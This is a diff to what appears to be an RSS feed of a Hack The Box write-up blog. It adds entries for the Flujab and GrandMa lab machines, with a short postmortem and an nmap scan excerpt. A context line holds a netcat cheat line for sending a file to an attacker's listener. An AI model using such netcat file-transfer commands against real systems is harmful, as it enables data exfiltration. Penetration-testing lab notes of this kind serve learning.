@@ -140,6 +140,28 @@ upload = nc -w 3 [your_ip] 1337 &amp;lt; file.txt listener = nc -lp 1337 &amp;gt
     </item>
     
     <item>
+      <title>Flujab</title>
+      <link>/hackthebox/boxes/flujab/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/boxes/flujab/</guid>
+      <description>Thank you to 0xdf and ippsec for their guides. Postmortem
+This will not be the typical guide. I will be covering highlights.
+Changeing /etc/hosts didn&amp;rsquo;t notice any change then i went to 0xdf notes. saw that openssl was used to get a list of of fqdmn. I thought it would be neat to use the same trick use din sizzle to get the certs. exporting the cert didn&amp;rsquo;t not yield the (field values).</description>
+    </item>
+    
+    <item>
+      <title>GrandMa</title>
+      <link>/hackthebox/boxes/grand-pa/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/boxes/grand-pa/</guid>
+      <description>Started out with nmap moved into enumeration with gobuster to enum web directories.
+Nmap
+![gobuster](https://chickenpwny.github.io/images/grandma/gobuster.PNG)nmap -sV -sC -T5 -p80 -oA total-first 10.10.10.15 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-30 20:05 EDT Nmap scan report for 10.10.10.15 Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT |_http-server-header: Microsoft-IIS/6.</description>
+    </item>
+    
+    <item>
       <title>HELP</title>
       <link>/hackthebox/boxes/help/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
